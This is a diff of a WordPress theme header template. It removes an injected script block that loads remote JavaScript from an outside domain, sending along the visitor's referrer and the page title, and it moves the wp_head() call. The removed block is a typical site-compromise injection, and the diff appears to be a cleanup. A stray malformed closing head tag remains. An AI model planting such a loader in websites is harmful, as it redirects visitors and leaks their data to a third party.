@@ -4,6 +4,7 @@
 
 <head id="pbkchicago">
 	<meta charset="utf-8">
+<?php wp_head(); ?>
 
 <?php $rCacheNum1 = rand(000000000000,9999999999999999); ?>
 
@@ -45,17 +46,7 @@
 		});
 </script>
 
-<?php wp_head(); ?>
 
-<script type="text/javascript">
-var d=document;var s=d.createElement('script');
-s.src='http://gethere.info/kt/?264dpr&frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '';
-if (document.currentScript) {
-document.currentScript.parentNode.insertBefore(s, document.currentScript);
-} else {
-d.getElementsByTagName('head')[0].appendChild(s);
-}
-</script>
 /head>
 
 <body <?php body_class(); ?>>
